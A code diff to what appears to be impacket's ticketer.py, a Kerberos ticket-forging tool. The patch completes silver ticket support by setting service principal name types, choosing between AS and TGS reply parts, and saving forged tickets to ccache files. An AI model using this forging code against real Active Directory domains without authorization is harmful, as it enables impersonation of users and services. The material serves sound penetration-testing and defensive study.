@@ -37,7 +37,7 @@
 #         as baduser.ccache.
 #
 # ToDo:
-# [X] Silver tickets still not implemented
+# [X] Silver tickets still not implemented - DONE by @machosec and fixes by @br4nsh
 # [ ] When -request is specified, we could ask for a user2user ticket and also populate the received PAC
 #
 import argparse
@@ -312,10 +312,15 @@ class TICKETER:
             kdcRep['ticket']['tkt-vno'] = ProtocolVersionNumber.pvno.value
             kdcRep['ticket']['realm'] = self.__domain.upper()
             kdcRep['ticket']['sname'] = noValue
-            kdcRep['ticket']['sname']['name-type'] = PrincipalNameType.NT_SRV_INST.value
             kdcRep['ticket']['sname']['name-string'] = noValue
             kdcRep['ticket']['sname']['name-string'][0] = self.__service
-            kdcRep['ticket']['sname']['name-string'][1] = self.__target
+
+            if self.__domain == self.__server:
+                kdcRep['ticket']['sname']['name-type'] = PrincipalNameType.NT_PRINCIPAL.value
+                kdcRep['ticket']['sname']['name-string'][1] = self.__domain.upper()
+            else:
+                kdcRep['ticket']['sname']['name-type'] = PrincipalNameType.NT_SRV_INST.value
+                kdcRep['ticket']['sname']['name-string'][1] = self.__target
 
             kdcRep['ticket']['enc-part'] = noValue
             kdcRep['ticket']['enc-part']['kvno'] = 2
@@ -483,10 +488,12 @@ class TICKETER:
 
         logging.info('\tPAC_CLIENT_INFO_TYPE')
         logging.info('\tEncTicketPart')
+
         if self.__domain == self.__server:
-            encRepPart = EncTGSRepPart()
-        else:
             encRepPart = EncASRepPart()
+        else:
+            encRepPart = EncTGSRepPart()
+
         encRepPart['key'] = noValue
         encRepPart['key']['keytype'] = encTicketPart['key']['keytype']
         encRepPart['key']['keyvalue'] = encTicketPart['key']['keyvalue']
@@ -503,11 +510,17 @@ class TICKETER:
         encRepPart['renew-till'] = encTicketPart['renew-till']
         encRepPart['srealm'] = self.__domain.upper()
         encRepPart['sname'] = noValue
-        encRepPart['sname']['name-type'] = PrincipalNameType.NT_SRV_INST.value
         encRepPart['sname']['name-string'] = noValue
         encRepPart['sname']['name-string'][0] = self.__service
-        encRepPart['sname']['name-string'][1] = self.__server
-        logging.info('\tEncAsRepPart')
+
+        if self.__domain == self.__server:
+            encRepPart['sname']['name-type'] = PrincipalNameType.NT_PRINCIPAL.value
+            encRepPart['sname']['name-string'][1] = self.__domain.upper()
+            logging.info('\tEncAsRepPart')
+        else:
+            encRepPart['sname']['name-type'] = PrincipalNameType.NT_SRV_INST.value
+            encRepPart['sname']['name-string'][1] = self.__server
+            logging.info('\tEncTGSRepPart')
 
         return encRepPart, encTicketPart, pacInfos
 
@@ -657,11 +670,15 @@ class TICKETER:
 
         return encoder.encode(kdcRep), cipher, sessionKey
 
-    def saveTicket(self, tgt, sessionKey):
+    def saveTicket(self, ticket, sessionKey):
         logging.info('Saving ticket in %s' % (self.__target.replace('/', '.') + '.ccache'))
         from impacket.krb5.ccache import CCache
         ccache = CCache()
-        ccache.fromTGT(tgt, sessionKey, sessionKey)
+
+        if self.__server == self.__domain:
+            ccache.fromTGT(ticket, sessionKey, sessionKey)
+        else:
+            ccache.fromTGS(ticket, sessionKey, sessionKey)
         ccache.saveFile(self.__target.replace('/','.') + '.ccache')
 
     def run(self):
